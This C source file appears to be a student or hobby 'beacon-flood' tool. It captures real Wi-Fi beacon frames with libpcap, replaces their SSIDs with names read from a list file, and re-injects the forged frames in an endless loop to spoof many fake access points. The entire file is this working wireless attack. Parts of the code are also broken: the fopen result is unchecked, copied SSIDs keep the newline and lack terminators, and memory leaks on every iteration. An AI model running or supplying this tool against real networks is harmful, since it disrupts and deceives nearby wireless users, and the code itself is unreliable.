#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <ncurses.h>
#include <string.h>

void usage() {
	printf("syntax: beacon-flood <interface> <ssid-list-file>\n");
	printf("sample: beacon-flood wlan0 ssid-list.txt\n");
}


typedef struct {
	char* dev_;
} Param;

Param param  = {
	.dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
	if (argc != 3) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
	return true;
}

typedef struct Node{
	struct Node *next;

    u_int8_t BSS_ID[6];

	int beacons;
	u_int8_t    tag_length;
	char* SSID;
}Node;


struct ieee80211_radiotap_header {
        u_int8_t        it_version;     /* set to 0 */
        u_int8_t        it_pad;
        u_int16_t       it_len;         /* entire length */
        u_int32_t       it_present;     /* fields present */
} __attribute__((__packed__));

struct beacon_frame{
    u_int8_t    subtype;
    u_int8_t    flags;

    u_int16_t   duration;

    u_int8_t DA[6];
    u_int8_t SA[6];
    u_int8_t BSS_ID[6];
    
    u_int16_t   fragment_sequence_number;

} __attribute__((__packed__));

struct necessary_field{

    u_int8_t   timestamp[8];

    u_int16_t   interval;

    u_int16_t   capacity_information;

    u_int8_t    tag_number;
    u_int8_t    tag_length;


} __attribute__((__packed__));


struct data{
	u_int8_t* data;
} __attribute__((__packed__));


struct tcp_hdr* get_radiotap_header(const u_char* data){
	struct tcp_hdr *tcp_header = (struct tcp_hdr *)data;

	return tcp_header;
}


bool search_beacon(Node *node, u_int8_t BSS_ID[]){
	while(node != NULL){
		if(!memcmp(BSS_ID, node->BSS_ID, 6)){
			node->beacons += 1;
			return true;
		}
		node = node->next;	
	}

	return false;
}

void add_node(Node *node, Node *new_node ){
	
	while(node->next != NULL)
		node = node->next;
	new_node->beacons += 1;	
	new_node->next = NULL;
	node->next = new_node;

	return ;
}
	

int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);

	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}
	
	const int max_tag_length = 32;
	FILE* fp = fopen(argv[2], "r");
	Node *head = malloc(sizeof(Node));
	head -> next = NULL;
	

	while(true){

		Node *node = malloc(sizeof(Node));

		struct pcap_pkthdr* header;
		const u_char* packet;

		struct ieee80211_radiotap_header* radiotap_header;
		struct beacon_frame* beacon;
		struct necessary_field* nf;

		char line[max_tag_length];
		char* ssid;
		ssid = fgets(line, max_tag_length, fp);

		if(feof(fp))
			rewind(fp);

		int res = pcap_next_ex(pcap, &header, &packet);

		
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			return 0;
		}
		
		
		radiotap_header = packet;
		
		beacon = packet + radiotap_header->it_len;
		
		nf = packet + radiotap_header->it_len + sizeof(struct beacon_frame);
		
		node->SSID = (char*)malloc(sizeof(char) * nf->tag_length);

		memcpy(node->SSID, packet+radiotap_header->it_len + sizeof(struct beacon_frame) + sizeof(struct necessary_field) , nf->tag_length);
		
		memcpy(node->BSS_ID,beacon->BSS_ID, 6);
		
		node->beacons = 0;
		node->tag_length = nf->tag_length;

		if(beacon->subtype == 0x80){
			if(search_beacon(head, node->BSS_ID)){}
			else{
				add_node(head,node);
			}
			
			int data_len = header->caplen - (radiotap_header->it_len + sizeof(struct beacon_frame) + sizeof(struct necessary_field) + nf->tag_length);// tag_name 뒤의 데이터

			const u_char* pck_2 = (u_char*)malloc(sizeof(u_char) * data_len);
			memcpy(pck_2, packet + radiotap_header->it_len + sizeof(struct beacon_frame) + sizeof(struct necessary_field) + nf->tag_length, data_len);

			nf->tag_length = strlen(ssid);
			char* send_SSID = (char*)malloc(sizeof(char) * nf->tag_length);
			memcpy(send_SSID, ssid, strlen(ssid));

			u_char* pck_1 = (u_char*)malloc(radiotap_header->it_len + sizeof(struct beacon_frame) + sizeof(struct necessary_field) + nf->tag_length);
			memcpy(pck_1, packet, radiotap_header->it_len + sizeof(struct beacon_frame));
			memcpy(pck_1 + radiotap_header->it_len + sizeof(struct beacon_frame), nf, sizeof(struct necessary_field));
			memcpy(pck_1 + radiotap_header->it_len + sizeof(struct beacon_frame) + sizeof(struct necessary_field), send_SSID, nf->tag_length);

			// pck_1, pck_2 합치기
			const u_char* pck = (u_char*)malloc(radiotap_header->it_len + sizeof(struct beacon_frame) + sizeof(struct necessary_field) + nf->tag_length + data_len);

			memcpy(pck,pck_1 , radiotap_header->it_len + sizeof(struct beacon_frame) + sizeof(struct necessary_field) + nf->tag_length);
			memcpy(pck+radiotap_header->it_len + sizeof(struct beacon_frame) + sizeof(struct necessary_field) + nf->tag_length, pck_2, data_len);

			int result = pcap_sendpacket(pcap, pck, radiotap_header->it_len + sizeof(struct beacon_frame) + sizeof(struct necessary_field) + nf->tag_length + data_len);
			if (result != 0)
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		}
	}
	
	pcap_close(pcap);
	return 0;
}



